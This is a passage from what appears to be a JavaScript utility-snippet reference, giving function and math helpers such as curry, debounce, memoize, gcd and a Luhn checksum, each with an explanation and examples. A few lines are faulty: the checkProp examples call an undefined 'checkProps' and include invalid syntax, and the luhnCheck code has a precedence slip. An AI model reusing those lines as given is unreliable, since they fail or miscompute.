(...args) => fn.apply(context, [...boundArgs, ...args]);\n\nExamples\nfunction greet(greeting, punctuation) {\n  return greeting + ' ' + this.user + punctuation;\n}\nconst freddy = { user: 'fred' };\nconst freddyBound = bind(greet, freddy);\nconsole.log(freddyBound('hi', '!')); // 'hi fred!'\n\n\u2b06 Back to top\nbindKey\nCreates a function that invokes the method at a given key of an object, optionally adding any additional supplied parameters to the beginning of the arguments.\nReturn a function that uses Function.prototype.apply() to bind context[fn] to context.\nUse the spread operator (...) to prepend any additional supplied parameters to the arguments.\nconst bindKey = (context, fn, ...boundArgs) => (...args) =>\n  context[fn].apply(context, [...boundArgs, ...args]);\n\nExamples\nconst freddy = {\n  user: 'fred',\n  greet: function(greeting, punctuation) {\n    return greeting + ' ' + this.user + punctuation;\n  }\n};\nconst freddyBound = bindKey(freddy, 'greet');\nconsole.log(freddyBound('hi', '!')); // 'hi fred!'\n\n\u2b06 Back to top\nchainAsync\nChains asynchronous functions.\nLoop through an array of functions containing asynchronous events, calling next when each asynchronous event has completed.\nconst chainAsync = fns => {\n  let curr = 0;\n  const last = fns[fns.length - 1];\n  const next = () => {\n    const fn = fns[curr++];\n    fn === last ? fn() : fn(next);\n  };\n  next();\n};\n\nExamples\nchainAsync([\n  next => {\n    console.log('0 seconds');\n    setTimeout(next, 1000);\n  },\n  next => {\n    console.log('1 second');\n    setTimeout(next, 1000);\n  },\n  () => {\n    console.log('2 second');\n  }\n]);\n\n\u2b06 Back to top\ncheckProp\nGiven a predicate function and a prop string, this curried function will then take an object to inspect by calling the property and passing it to the predicate.\nSummon prop on obj, pass it to a provided predicate function and return a masked boolean.\nconst checkProp = (predicate, prop) => obj => !!predicate(obj[prop]);\n\nExamples\n\n\n\n\n\n\n\nconst lengthIs4 = checkProp(l => l === 4, 'length');\nlengthIs4([]); // false\nlengthIs4([1,2,3,4]); // true\nlengthIs4(new Set([1,2,3,4])); // false (Set uses Size, not length)\n\nconst session = { user: {} };\nconst validUserSession = checkProps(u => u.active && !u.disabled, 'user');\n\nvalidUserSession(session); // false\n\nsession.user.active = true;\nvalidUserSession(session); // true\n\nconst noLength(l => l === undefined, 'length');\nnoLength([]); // false\nnoLength({}); // true\nnoLength(new Set()); // true\n\n\u2b06 Back to top\ncompose\nPerforms right-to-left function composition.\nUse Array.prototype.reduce() to perform right-to-left function composition.\nThe last (rightmost) function can accept one or more arguments; the remaining functions must be unary.\nconst compose = (...fns) => fns.reduce((f, g) => (...args) => f(g(...args)));\n\nExamples\nconst add5 = x => x + 5;\nconst multiply = (x, y) => x * y;\nconst multiplyAndAdd5 = compose(\n  add5,\n  multiply\n);\nmultiplyAndAdd5(5, 2); // 15\n\n\u2b06 Back to top\ncomposeRight\nPerforms left-to-right function composition.\nUse Array.prototype.reduce() to perform left-to-right function composition.\nThe first (leftmost) function can accept one or more arguments; the remaining functions must be unary.\nconst composeRight = (...fns) => fns.reduce((f, g) => (...args) => g(f(...args)));\n\nExamples\nconst add = (x, y) => x + y;\nconst square = x => x * x;\nconst addAndSquare = composeRight(add, square);\naddAndSquare(1, 2); // 9\n\n\u2b06 Back to top\nconverge\nAccepts a converging function and a list of branching functions and returns a function that applies each branching function to the arguments and the results of the branching functions are passed as arguments to the converging function.\nUse Array.prototype.map() and Function.prototype.apply() to apply each function to the given arguments.\nUse the spread operator (...) to call coverger with the results of all other functions.\nconst converge = (converger, fns) => (...args) => converger(...fns.map(fn => fn.apply(null, args)));\n\nExamples\nconst average = converge((a, b) => a / b, [\n  arr => arr.reduce((a, v) => a + v, 0),\n  arr => arr.length\n]);\naverage([1, 2, 3, 4, 5, 6, 7]); // 4\n\n\u2b06 Back to top\ncurry\nCurries a function.\nUse recursion.\nIf the number of provided arguments (args) is sufficient, call the passed function fn.\nOtherwise, return a curried function fn that expects the rest of the arguments.\nIf you want to curry a function that accepts a variable number of arguments (a variadic function, e.g. Math.min()), you can optionally pass the number of arguments to the second parameter arity.\nconst curry = (fn, arity = fn.length, ...args) =>\n  arity <= args.length ? fn(...args) : curry.bind(null, fn, arity, ...args);\n\nExamples\ncurry(Math.pow)(2)(10); // 1024\ncurry(Math.min, 3)(10)(50)(2); // 2\n\n\u2b06 Back to top\ndebounce\nCreates a debounced function that delays invoking the provided function until at least ms milliseconds have elapsed since the last time it was invoked.\nEach time the debounced function is invoked, clear the current pending timeout with clearTimeout() and use setTimeout() to create a new timeout that delays invoking the function until at least ms milliseconds has elapsed. Use Function.prototype.apply() to apply the this context to the function and provide the necessary arguments.\nOmit the second argument, ms, to set the timeout at a default of 0 ms.\nconst debounce = (fn, ms = 0) => {\n  let timeoutId;\n  return function(...args) {\n    clearTimeout(timeoutId);\n    timeoutId = setTimeout(() => fn.apply(this, args), ms);\n  };\n};\n\nExamples\nwindow.addEventListener(\n  'resize',\n  debounce(() => {\n    console.log(window.innerWidth);\n    console.log(window.innerHeight);\n  }, 250)\n); // Will log the window dimensions at most every 250ms\n\n\u2b06 Back to top\ndefer\nDefers invoking a function until the current call stack has cleared.\nUse setTimeout() with a timeout of 1ms to add a new event to the browser event queue and allow the rendering engine to complete its work. Use the spread (...) operator to supply the function with an arbitrary number of arguments.\nconst defer = (fn, ...args) => setTimeout(fn, 1, ...args);\n\nExamples\n// Example A:\ndefer(console.log, 'a'), console.log('b'); // logs 'b' then 'a'\n\n// Example B:\ndocument.querySelector('#someElement').innerHTML = 'Hello';\nlongRunningFunction(); // Browser will not update the HTML until this has finished\ndefer(longRunningFunction); // Browser will update the HTML then run the function\n\n\u2b06 Back to top\ndelay\nInvokes the provided function after wait milliseconds.\nUse setTimeout() to delay execution of fn.\nUse the spread (...) operator to supply the function with an arbitrary number of arguments.\nconst delay = (fn, wait, ...args) => setTimeout(fn, wait, ...args);\n\nExamples\ndelay(\n  function(text) {\n    console.log(text);\n  },\n  1000,\n  'later'\n); // Logs 'later' after one second.\n\n\u2b06 Back to top\nfunctionName\nLogs the name of a function.\nUse console.debug() and the name property of the passed method to log the method's name to the debug channel of the console.\nconst functionName = fn => (console.debug(fn.name), fn);\n\nExamples\nfunctionName(Math.max); // max (logged in debug channel of console)\n\n\u2b06 Back to top\nhz\nReturns the number of times a function executed per second.\nhz is the unit for hertz, the unit of frequency defined as one cycle per second.\nUse performance.now() to get the difference in milliseconds before and after the iteration loop to calculate the time elapsed executing the function iterations times.\nReturn the number of cycles per second by converting milliseconds to seconds and dividing it by the time elapsed.\nOmit the second argument, iterations, to use the default of 100 iterations.\nconst hz = (fn, iterations = 100) => {\n  const before = performance.now();\n  for (let i = 0; i < iterations; i++) fn();\n  return (1000 * iterations) / (performance.now() - before);\n};\n\nExamples\n// 10,000 element array\nconst numbers = Array(10000)\n  .fill()\n  .map((_, i) => i);\n\n// Test functions with the same goal: sum up the elements in the array\nconst sumReduce = () => numbers.reduce((acc, n) => acc + n, 0);\nconst sumForLoop = () => {\n  let sum = 0;\n  for (let i = 0; i < numbers.length; i++) sum += numbers[i];\n  return sum;\n};\n\n// `sumForLoop` is nearly 10 times faster\nMath.round(hz(sumReduce)); // 572\nMath.round(hz(sumForLoop)); // 4784\n\n\u2b06 Back to top\nmemoize \nReturns the memoized (cached) function.\nCreate an empty cache by instantiating a new Map object.\nReturn a function which takes a single argument to be supplied to the memoized function by first checking if the function's output for that specific input value is already cached, or store and return it if not. The function keyword must be used in order to allow the memoized function to have its this context changed if necessary.\nAllow access to the cache by setting it as a property on the returned function.\nconst memoize = fn => {\n  const cache = new Map();\n  const cached = function(val) {\n    return cache.has(val) ? cache.get(val) : cache.set(val, fn.call(this, val)) && cache.get(val);\n  };\n  cached.cache = cache;\n  return cached;\n};\n\nExamples\n// See the `anagrams` snippet.\nconst anagramsCached = memoize(anagrams);\nanagramsCached('javascript'); // takes a long time\nanagramsCached('javascript'); // returns virtually instantly since it's now cached\nconsole.log(anagramsCached.cache); // The cached anagrams map\n\n\u2b06 Back to top\nnegate\nNegates a predicate function.\nTake a predicate function and apply the not operator (!) to it with its arguments.\nconst negate = func => (...args) => !func(...args);\n\nExamples\n[1, 2, 3, 4, 5, 6].filter(negate(n => n % 2 === 0)); // [ 1, 3, 5 ]\n\n\u2b06 Back to top\nonce\nEnsures a function is called only once.\nUtilizing a closure, use a flag, called, and set it to true once the function is called for the first time, preventing it from being called again. In order to allow the function to have its this context changed (such as in an event listener), the function keyword must be used, and the supplied function must have the context applied.\nAllow the function to be supplied with an arbitrary number of arguments using the rest/spread (...) operator.\nconst once = fn => {\n  let called = false;\n  return function(...args) {\n    if (called) return;\n    called = true;\n    return fn.apply(this, args);\n  };\n};\n\nExamples\nconst startApp = function(event) {\n  console.log(this, event); // document.body, MouseEvent\n};\ndocument.body.addEventListener('click', once(startApp)); // only runs `startApp` once upon click\n\n\u2b06 Back to top\npartial\nCreates a function that invokes fn with partials prepended to the arguments it receives.\nUse the spread operator (...) to prepend partials to the list of arguments of fn.\nconst partial = (fn, ...partials) => (...args) => fn(...partials, ...args);\n\nExamples\nconst greet = (greeting, name) => greeting + ' ' + name + '!';\nconst greetHello = partial(greet, 'Hello');\ngreetHello('John'); // 'Hello John!'\n\n\u2b06 Back to top\npartialRight\nCreates a function that invokes fn with partials appended to the arguments it receives.\nUse the spread operator (...) to append partials to the list of arguments of fn.\nconst partialRight = (fn, ...partials) => (...args) => fn(...args, ...partials);\n\nExamples\nconst greet = (greeting, name) => greeting + ' ' + name + '!';\nconst greetJohn = partialRight(greet, 'John');\ngreetJohn('Hello'); // 'Hello John!'\n\n\u2b06 Back to top\nrunPromisesInSeries\nRuns an array of promises in series.\nUse Array.prototype.reduce() to create a promise chain, where each promise returns the next promise when resolved.\nconst runPromisesInSeries = ps => ps.reduce((p, next) => p.then(next), Promise.resolve());\n\nExamples\nconst delay = d => new Promise(r => setTimeout(r, d));\nrunPromisesInSeries([() => delay(1000), () => delay(2000)]); // Executes each promise sequentially, taking a total of 3 seconds to complete\n\n\u2b06 Back to top\nsleep\nDelays the execution of an asynchronous function.\nDelay executing part of an async function, by putting it to sleep, returning a Promise.\nconst sleep = ms => new Promise(resolve => setTimeout(resolve, ms));\n\nExamples\nasync function sleepyWork() {\n  console.log(\"I'm going to sleep for 1 second.\");\n  await sleep(1000);\n  console.log('I woke up after 1 second.');\n}\n\n\u2b06 Back to top\nthrottle \nCreates a throttled function that only invokes the provided function at most once per every wait milliseconds\nUse setTimeout() and clearTimeout() to throttle the given method, fn.\nUse Function.prototype.apply() to apply the this context to the function and provide the necessary arguments.\nUse Date.now() to keep track of the last time the throttled function was invoked.\nOmit the second argument, wait, to set the timeout at a default of 0 ms.\nconst throttle = (fn, wait) => {\n  let inThrottle, lastFn, lastTime;\n  return function() {\n    const context = this,\n      args = arguments;\n    if (!inThrottle) {\n      fn.apply(context, args);\n      lastTime = Date.now();\n      inThrottle = true;\n    } else {\n      clearTimeout(lastFn);\n      lastFn = setTimeout(function() {\n        if (Date.now() - lastTime >= wait) {\n          fn.apply(context, args);\n          lastTime = Date.now();\n        }\n      }, Math.max(wait - (Date.now() - lastTime), 0));\n    }\n  };\n};\n\nExamples\nwindow.addEventListener(\n  'resize',\n  throttle(function(evt) {\n    console.log(window.innerWidth);\n    console.log(window.innerHeight);\n  }, 250)\n); // Will log the window dimensions at most every 250ms\n\n\u2b06 Back to top\ntimes\nIterates over a callback n times\nUse Function.call() to call fn n times or until it returns false.\nOmit the last argument, context, to use an undefined object (or the global object in non-strict mode).\nconst times = (n, fn, context = undefined) => {\n  let i = 0;\n  while (fn.call(context, i) !== false && ++i < n) {}\n};\n\nExamples\nvar output = '';\ntimes(5, i => (output += i));\nconsole.log(output); // 01234\n\n\u2b06 Back to top\nuncurry\nUncurries a function up to depth n.\nReturn a variadic function.\nUse Array.prototype.reduce() on the provided arguments to call each subsequent curry level of the function.\nIf the length of the provided arguments is less than n throw an error.\nOtherwise, call fn with the proper amount of arguments, using Array.prototype.slice(0, n).\nOmit the second argument, n, to uncurry up to depth 1.\nconst uncurry = (fn, n = 1) => (...args) => {\n  const next = acc => args => args.reduce((x, y) => x(y), acc);\n  if (n > args.length) throw new RangeError('Arguments too few!');\n  return next(fn)(args.slice(0, n));\n};\n\nExamples\nconst add = x => y => z => x + y + z;\nconst uncurriedAdd = uncurry(add, 3);\nuncurriedAdd(1, 2, 3); // 6\n\n\u2b06 Back to top\nunfold\nBuilds an array, using an iterator function and an initial seed value.\nUse a while loop and Array.prototype.push() to call the function repeatedly until it returns false.\nThe iterator function accepts one argument (seed) and must always return an array with two elements ([value, nextSeed]) or false to terminate.\nconst unfold = (fn, seed) => {\n  let result = [],\n    val = [null, seed];\n  while ((val = fn(val[1]))) result.push(val[0]);\n  return result;\n};\n\nExamples\nvar f = n => (n > 50 ? false : [-n, n + 10]);\nunfold(f, 10); // [-10, -20, -30, -40, -50]\n\n\u2b06 Back to top\nwhen\nTests a value, x, against a predicate function. If true, return fn(x). Else, return x.\nReturn a function expecting a single value, x, that returns the appropriate value based on pred.\nconst when = (pred, whenTrue) => x => (pred(x) ? whenTrue(x) : x);\n\nExamples\nconst doubleEvenNumbers = when(x => x % 2 === 0, x => x * 2);\ndoubleEvenNumbers(2); // 4\ndoubleEvenNumbers(1); // 1\n\n\u2b06 Back to top\n\n\u2797 Math\napproximatelyEqual\nChecks if two numbers are approximately equal to each other.\nUse Math.abs() to compare the absolute difference of the two values to epsilon.\nOmit the third parameter, epsilon, to use a default value of 0.001.\nconst approximatelyEqual = (v1, v2, epsilon = 0.001) => Math.abs(v1 - v2) < epsilon;\n\nExamples\napproximatelyEqual(Math.PI / 2.0, 1.5708); // true\n\n\u2b06 Back to top\naverage\nReturns the average of two or more numbers.\nUse Array.prototype.reduce() to add each value to an accumulator, initialized with a value of 0, divide by the length of the array.\nconst average = (...nums) => nums.reduce((acc, val) => acc + val, 0) / nums.length;\n\nExamples\naverage(...[1, 2, 3]); // 2\naverage(1, 2, 3); // 2\n\n\u2b06 Back to top\naverageBy\nReturns the average of an array, after mapping each element to a value using the provided function.\nUse Array.prototype.map() to map each element to the value returned by fn, Array.prototype.reduce() to add each value to an accumulator, initialized with a value of 0, divide by the length of the array.\nconst averageBy = (arr, fn) =>\n  arr.map(typeof fn === 'function' ? fn : val => val[fn]).reduce((acc, val) => acc + val, 0) /\n  arr.length;\n\nExamples\naverageBy([{ n: 4 }, { n: 2 }, { n: 8 }, { n: 6 }], o => o.n); // 5\naverageBy([{ n: 4 }, { n: 2 }, { n: 8 }, { n: 6 }], 'n'); // 5\n\n\u2b06 Back to top\nbinomialCoefficient\nEvaluates the binomial coefficient of two integers n and k.\nUse Number.isNaN() to check if any of the two values is NaN.\nCheck if k is less than 0, greater than or equal to n, equal to 1 or n - 1 and return the appropriate result.\nCheck if n - k is less than k and switch their values accordingly.\nLoop from 2 through k and calculate the binomial coefficient.\nUse Math.round() to account for rounding errors in the calculation.\nconst binomialCoefficient = (n, k) => {\n  if (Number.isNaN(n) || Number.isNaN(k)) return NaN;\n  if (k < 0 || k > n) return 0;\n  if (k === 0 || k === n) return 1;\n  if (k === 1 || k === n - 1) return n;\n  if (n - k < k) k = n - k;\n  let res = n;\n  for (let j = 2; j <= k; j++) res *= (n - j + 1) / j;\n  return Math.round(res);\n};\n\nExamples\nbinomialCoefficient(8, 2); // 28\n\n\u2b06 Back to top\nclampNumber\nClamps num within the inclusive range specified by the boundary values a and b.\nIf num falls within the range, return num.\nOtherwise, return the nearest number in the range.\nconst clampNumber = (num, a, b) => Math.max(Math.min(num, Math.max(a, b)), Math.min(a, b));\n\nExamples\nclampNumber(2, 3, 5); // 3\nclampNumber(1, -1, -5); // -1\n\n\u2b06 Back to top\ndegreesToRads\nConverts an angle from degrees to radians.\nUse Math.PI and the degree to radian formula to convert the angle from degrees to radians.\nconst degreesToRads = deg => (deg * Math.PI) / 180.0;\n\nExamples\ndegreesToRads(90.0); // ~1.5708\n\n\u2b06 Back to top\ndigitize\nConverts a number to an array of digits.\nConvert the number to a string, using the spread operator (...) to build an array.\nUse Array.prototype.map() and parseInt() to transform each value to an integer.\nconst digitize = n => [...`${n}`].map(i => parseInt(i));\n\nExamples\ndigitize(123); // [1, 2, 3]\n\n\u2b06 Back to top\ndistance\nReturns the distance between two points.\nUse Math.hypot() to calculate the Euclidean distance between two points.\nconst distance = (x0, y0, x1, y1) => Math.hypot(x1 - x0, y1 - y0);\n\nExamples\ndistance(1, 1, 2, 3); // 2.23606797749979\n\n\u2b06 Back to top\nelo \nComputes the new ratings between two or more opponents using the Elo rating system. It takes an array\nof pre-ratings and returns an array containing post-ratings.\nThe array should be ordered from best performer to worst performer (winner -> loser).\nUse the exponent ** operator and math operators to compute the expected score (chance of winning).\nof each opponent and compute the new rating for each.\nLoop through the ratings, using each permutation to compute the post-Elo rating for each player in a pairwise fashion.\nOmit the second argument to use the default kFactor of 32.\nconst elo = ([...ratings], kFactor = 32, selfRating) => {\n  const [a, b] = ratings;\n  const expectedScore = (self, opponent) => 1 / (1 + 10 ** ((opponent - self) / 400));\n  const newRating = (rating, i) =>\n    (selfRating || rating) + kFactor * (i - expectedScore(i ? a : b, i ? b : a));\n  if (ratings.length === 2) return [newRating(a, 1), newRating(b, 0)];\n\n  for (let i = 0, len = ratings.length; i < len; i++) {\n    let j = i;\n    while (j < len - 1) {\n      j++;\n      [ratings[i], ratings[j]] = elo([ratings[i], ratings[j]], kFactor);\n    }\n  }\n  return ratings;\n};\n\nExamples\n// Standard 1v1s\nelo([1200, 1200]); // [1216, 1184]\nelo([1200, 1200], 64); // [1232, 1168]\n// 4 player FFA, all same rank\nelo([1200, 1200, 1200, 1200]).map(Math.round); // [1246, 1215, 1185, 1154]\n/*\nFor teams, each rating can adjusted based on own team's average rating vs.\naverage rating of opposing team, with the score being added to their\nown individual rating by supplying it as the third argument.\n*/\n\n\u2b06 Back to top\nfactorial\nCalculates the factorial of a number.\nUse recursion.\nIf n is less than or equal to 1, return 1.\nOtherwise, return the product of n and the factorial of n - 1.\nThrows an exception if n is a negative number.\nconst factorial = n =>\n  n < 0\n    ? (() => {\n      throw new TypeError('Negative numbers are not allowed!');\n    })()\n    : n <= 1\n      ? 1\n      : n * factorial(n - 1);\n\nExamples\nfactorial(6); // 720\n\n\u2b06 Back to top\nfibonacci\nGenerates an array, containing the Fibonacci sequence, up until the nth term.\nCreate an empty array of the specific length, initializing the first two values (0 and 1).\nUse Array.prototype.reduce() to add values into the array, using the sum of the last two values, except for the first two.\nconst fibonacci = n =>\n  Array.from({ length: n }).reduce(\n    (acc, val, i) => acc.concat(i > 1 ? acc[i - 1] + acc[i - 2] : i),\n    []\n  );\n\nExamples\nfibonacci(6); // [0, 1, 1, 2, 3, 5]\n\n\u2b06 Back to top\ngcd\nCalculates the greatest common divisor between two or more numbers/arrays.\nThe inner _gcd function uses recursion.\nBase case is when y equals 0. In this case, return x.\nOtherwise, return the GCD of y and the remainder of the division x/y.\nconst gcd = (...arr) => {\n  const _gcd = (x, y) => (!y ? x : gcd(y, x % y));\n  return [...arr].reduce((a, b) => _gcd(a, b));\n};\n\nExamples\ngcd(8, 36); // 4\ngcd(...[12, 8, 32]); // 4\n\n\u2b06 Back to top\ngeometricProgression\nInitializes an array containing the numbers in the specified range where start and end are inclusive and the ratio between two terms is step.\nReturns an error if step equals 1.\nUse Array.from(), Math.log() and Math.floor() to create an array of the desired length, Array.prototype.map() to fill with the desired values in a range.\nOmit the second argument, start, to use a default value of 1.\nOmit the third argument, step, to use a default value of 2.\nconst geometricProgression = (end, start = 1, step = 2) =>\n  Array.from({ length: Math.floor(Math.log(end / start) / Math.log(step)) + 1 }).map(\n    (v, i) => start * step ** i\n  );\n\nExamples\ngeometricProgression(256); // [1, 2, 4, 8, 16, 32, 64, 128, 256]\ngeometricProgression(256, 3); // [3, 6, 12, 24, 48, 96, 192]\ngeometricProgression(256, 1, 4); // [1, 4, 16, 64, 256]\n\n\u2b06 Back to top\nhammingDistance\nCalculates the Hamming distance between two values.\nUse XOR operator (^) to find the bit difference between the two numbers, convert to a binary string using toString(2).\nCount and return the number of 1s in the string, using match(/1/g).\nconst hammingDistance = (num1, num2) => ((num1 ^ num2).toString(2).match(/1/g) || '').length;\n\nExamples\nhammingDistance(2, 3); // 1\n\n\u2b06 Back to top\ninRange\nChecks if the given number falls within the given range.\nUse arithmetic comparison to check if the given number is in the specified range.\nIf the second parameter, end, is not specified, the range is considered to be from 0 to start.\nconst inRange = (n, start, end = null) => {\n  if (end && start > end) [end, start] = [start, end];\n  return end == null ? n >= 0 && n < start : n >= start && n < end;\n};\n\nExamples\ninRange(3, 2, 5); // true\ninRange(3, 4); // true\ninRange(2, 3, 5); // false\ninRange(3, 2); // false\n\n\u2b06 Back to top\nisDivisible\nChecks if the first numeric argument is divisible by the second one.\nUse the modulo operator (%) to check if the remainder is equal to 0.\nconst isDivisible = (dividend, divisor) => dividend % divisor === 0;\n\nExamples\nisDivisible(6, 3); // true\n\n\u2b06 Back to top\nisEven\nReturns true if the given number is even, false otherwise.\nChecks whether a number is odd or even using the modulo (%) operator.\nReturns true if the number is even, false if the number is odd.\nconst isEven = num => num % 2 === 0;\n\nExamples\nisEven(3); // false\n\n\u2b06 Back to top\nisNegativeZero\nChecks if the given value is equal to negative zero (-0).\nChecks whether a passed value is equal to 0 and if 1 divided by the value equals -Infinity.\nconst isNegativeZero = val => val === 0 && 1 / val === -Infinity;\n\nExamples\nisNegativeZero(-0); // true\nisNegativeZero(0); // false\n\n\u2b06 Back to top\nisPrime\nChecks if the provided integer is a prime number.\nCheck numbers from 2 to the square root of the given number.\nReturn false if any of them divides the given number, else return true, unless the number is less than 2.\nconst isPrime = num => {\n  const boundary = Math.floor(Math.sqrt(num));\n  for (var i = 2; i <= boundary; i++) if (num % i === 0) return false;\n  return num >= 2;\n};\n\nExamples\nisPrime(11); // true\n\n\u2b06 Back to top\nlcm\nReturns the least common multiple of two or more numbers.\nUse the greatest common divisor (GCD) formula and the fact that lcm(x,y) = x * y / gcd(x,y) to determine the least common multiple.\nThe GCD formula uses recursion.\nconst lcm = (...arr) => {\n  const gcd = (x, y) => (!y ? x : gcd(y, x % y));\n  const _lcm = (x, y) => (x * y) / gcd(x, y);\n  return [...arr].reduce((a, b) => _lcm(a, b));\n};\n\nExamples\nlcm(12, 7); // 84\nlcm(...[1, 3, 4, 5]); // 60\n\n\u2b06 Back to top\nluhnCheck \nImplementation of the Luhn Algorithm used to validate a variety of identification numbers, such as credit card numbers, IMEI numbers, National Provider Identifier numbers etc.\nUse String.prototype.split(''), Array.prototype.reverse() and Array.prototype.map() in combination with parseInt() to obtain an array of digits.\nUse Array.prototype.splice(0,1) to obtain the last digit.\nUse Array.prototype.reduce() to implement the Luhn Algorithm.\nReturn true if sum is divisible by 10, false otherwise.\nconst luhnCheck = num => {\n  let arr = (num + '')\n    .split('')\n    .reverse()\n    .map(x => parseInt(x));\n  let lastDigit = arr.splice(0, 1)[0];\n  let sum = arr.reduce((acc, val, i) => (i % 2 !== 0 ? acc + val : acc + ((val * 2) % 9) || 9), 0);\n  sum += lastDigit;\n  return sum % 10 === 0;\n};\n\nExamples\nluhnCheck('4485275742308327'); // true\nluhnCheck(6011329933655299); //  false\nluhnCheck(123456789); // false\n\n\u2b06 Back to top\nmapNumRange\nMaps a number from one range to another range.\nReturns num mapped between outMin-outMax from inMin-inMax.\nconst mapNumRange = (num, inMin, inMax, outMin, outMax) =>\n  ((num - inMin) * (outMax - outMin)) / (inMax - inMin) + outMin;\n\nExamples\nmapNumRange(5, 0, 10, 0, 100); // 50\n\n\u2b06 Back to top\nmaxBy\nReturns the maximum value of an array, after mapping each element to a value using the provided function.\nUse Array.prototype.map() to map each element to the value returned by fn, Math.max() to get the maximum value.\nconst maxBy = (arr, fn) => Math.max(...arr.map(typeof fn === 'function' ? fn : val => val[fn]));\n\nExamples\nmaxBy([{ n: 4 }, { n: 2 }, { n: 8 }, { n: 6 }], o => o.n); // 8\nmaxBy([{ n: 4 }, { n: 2 }, { n: 8 }, { n: 6 }], 'n'); // 8\n\n\u2b06 Back to top\nmedian\nReturns the median of an array of numbers.\nFind the middle of the array, use Array.prototype.sort() to sort the values.\nReturn the number at the midpoint if length is odd, otherwise the average of the two middle numbers.\nconst median = arr => {\n  const mid = Math.floor(arr.length / 2),\n    nums = [...arr].sort((a, b) => a - b);\n  return arr.length % 2 !== 0 ? nums[mid] : (nums[mid - 1] + nums[mid]) / 2;\n};\n\nExamples\nmedian([5, 6, 50, 1, -5]); // 5\n\n\u2b06 Back to top\nmidpoint\nCalculates the midpoint between two pairs of (x,y) points.\nDestructure the array to get x1, y1, x2 and y2, calculate the midpoint for each dimension by dividing the sum of the two endpoints by 2.\nconst midpoint = ([x1, y1], [x2, y2]) => [(x1 + x2) / 2, (y1 + y2) / 2];\n\nExamples\nmidpoint([2, 2], [4, 4]); // [3, 3]\nmidpoint([4, 4], [6, 6]); // [5, 5]\nmidpoint([1, 3], [2, 4]); // [1.5, 3.5]\n\n\u2b06 Back to top\nminBy\nReturns the minimum value of an array, after mapping each element to a value using the provided function.\nUse Array.prototype.map() to map each element to the value returned by fn, Math.min() to get the minimum value.\nconst minBy = (arr, fn) => Math.min(...arr.map(typeof fn === 'function' ? fn : val => val[fn]));\n\nExamples\nminBy([{ n: 4 }, { n: 2 }, { n: 8 }, { n: 6 }], o => o.n); // 2\nminBy([{ n: 4 }, { n: 2 }, { n: 8 }, { n: 6 }], 'n'); // 2\n\n\u2b06 Back to top\npercentile\nUses the percentile formula to calculate how many numbers in the given array are less or equal to the given value.\nUse Array.prototype.reduce() to calculate how many numbers are below the value and how many are the same value and apply the percentile formula.\nconst percentile = (arr, val) =>\n  (100 * arr.reduce((acc, v) => acc + (v < val ? 1 : 0) + (v === val ? 0.5 : 0), 0)) / arr.length;\n\nExamples\npercentile([1, 2, 3, 4, 5, 6, 7, 8, 9, 10], 6); // 55\n\n\u2b06 Back to top\npowerset\nReturns the powerset of a given array of numbers.\nUse Array.prototype.reduce() combined with Array.prototype.map() to iterate over elements and combine into an array containing all combinations.\nconst powerset = arr => arr.reduce((a, v) => a.concat(a.map(r => [v].concat(r))), [[]]);\n\nExamples\npowerset([1, 2]); // [[], [1], [2], [2, 1]]\n\n\u2b06 Back to top\nprimes\nGenerates primes up to a given number, using the Sieve of Eratosthenes.\nGenerate an array from 2 to the given number. Use Array.prototype.filter() to filter out the values divisible by any number from 2 to the square root of the provided number.\nconst primes = num => {\n  let arr = Array.from({ length: num - 1 }).map((x, i) => i + 2),\n    sqroot = Math.floor(Math.sqrt(num)),\n    numsTillSqroot = Array.from({ length: sqroot - 1 }).map((x, i) => i + 2);\n  numsTillSqroot.forEach(x => (arr = arr.filter(y => y % x !== 0 || y === x)));\n  return arr;\n};\n\nExamples\nprimes(10); // [2,3,5,7]\n\n\u2b06 Back to top\nradsToDegrees\nConverts an angle from radians to degrees.\nUse Math.PI and the radian to degree formula to convert the angle from radians to degrees.\nconst radsToDegrees = rad => (rad * 180.0) / Math.PI;\n\nExamples\nradsToDegrees(Math.PI / 2); // 90\n\n\u2b06 Back to top\nrandomIntArrayInRange\nReturns an array of n random integers in the specified range.\nUse Array.from() to create an empty array of the specific length, Math.random() to generate a random number and map it to the desired range, using Math.floor() to make it an integer.\nconst randomIntArrayInRange = (min, max, n = 1) =>\n  Array.from({ length: n }, () => Math.floor(Math.random() * (max - min + 1)) + min);\n\nExamples\nrandomIntArrayInRange(12, 35, 10); // [ 34, 14, 27, 17, 30, 27, 20, 26, 21, 14 ]\n\n\u2b06 Back to top\nrandomIntegerInRange\nReturns a random integer in the specified range.\nUse Math.random() to generate a random number and map it to the desired range, using Math.floor() to make it an integer.\nconst randomIntegerInRange = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;\n\nExamples\nrandomIntegerInRange(0, 5); // 2\n\n\u2b06 Back to top\nrandomNumberInRange\nReturns a random number in the specified range.\nUse Math.random() to generate a random value, map it to the desired range using multiplication.\nconst randomNumberInRange = (min, max) => Math.random() * (max - min) + min;\n\nExamples\nrandomNumberInRange(2, 10); // 6.0211363285087005\n\n\u2b06 Back to top\nround\nRounds a number to a specified amount of digits.\nUse Math.round() and template literals to round the number to the specified number of digits.\nOmit the second argument, decimals to round to an integer.\nconst round = (n, decimals = 0) => Number(`${Math.round(`${n}e${decimals}`)}e-${decimals}`);\n\nExamples\nround(1.005, 2); // 1.01\n\n\u2b06 Back to top\nsdbm\nHashes the input string into a whole number.\nUse String.prototype.split('') and Array.prototype.reduce() to create a hash of the input string, utilizing bit shifting.\nconst sdbm = str => {\n  let arr = str.split('');\n  return arr.reduce(\n    (hashCode, currentVal) =>\n      (hashCode = currentVal.charCodeAt(0) + (hashCode << 6) + (hashCode << 16) - hashCode),\n    0\n  );\n};\n\nExamples\nsdbm('name'); // -3521204949\n\n\u2b06 Back to top\nstandardDeviation\nReturns the standard deviation of an array of numbers.\nUse Array.prototype.reduce() to calculate the mean, variance and the sum of the variance of the values, the variance of the values, then\ndetermine the standard deviation.\nYou can omit the second argument to get the sample standard deviation or set it to true to get the population standard deviation.\nconst standardDeviation = (arr, usePopulation = false) => {\n  const mean = arr.reduce((acc, val) => acc + val, 0) / arr.length;\n  return Math.sqrt(\n    arr.reduce((acc, val) => acc.concat((val - mean) ** 2), []).reduce((acc, val) => acc + val, 0) /\n      (arr.length - (usePopulation ? 0 : 1))\n  );\n};\n\nExamples\nstandardDeviation([10, 2, 38, 23, 38, 23, 21]); // 13.284434142114991 (sample)\nstandardDeviation([10, 2, 38, 23, 38, 23, 21], true); // 12.29899614287479 (population)\n\n\u2b06 Back to top\nsum\nReturns the sum of two or more numbers/arrays.\nUse Array.prototype.reduce() to add each value to an accumulator, initialized with a value of 0.\nconst sum = (...arr) => 